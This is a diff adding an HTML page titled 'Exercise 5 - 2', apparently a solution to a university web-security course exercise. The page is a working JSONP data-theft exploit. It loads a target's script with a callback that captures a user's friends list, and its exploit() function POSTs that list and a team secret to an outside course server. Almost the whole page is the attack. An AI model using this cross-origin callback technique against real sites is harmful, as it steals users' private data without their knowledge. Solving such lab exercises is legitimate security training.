@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exercise 5 - 2</title>
+   
+</head>
+<body>
+
+
+<script>
+	var friends =[];
+	function writeFriends(friend){
+		friend.forEach(function(f){
+			console.log(f);
+			friends.push(f);
+		});
+		exploit();
+	}
+	   
+
+	function exploit() {
+		var data = new FormData();
+		data.append('team_secret','ba316432f8e15f8e');
+		data.append('secret', 'Friends:'+ friends.join(", "));
+		//console.log(friends);
+		var xhr = new XMLHttpRequest();
+		xhr.open("POST", "https://gameserver.websec.saarland/feedback/8", true);
+		xhr.send(data);
+
+		xhr.send(null);
+	}
+
+</script>
+ <script src="https://cdn.team0.screecher.de/friendscript?cb=writeFriends"></script>
+
+</body>
+</html>
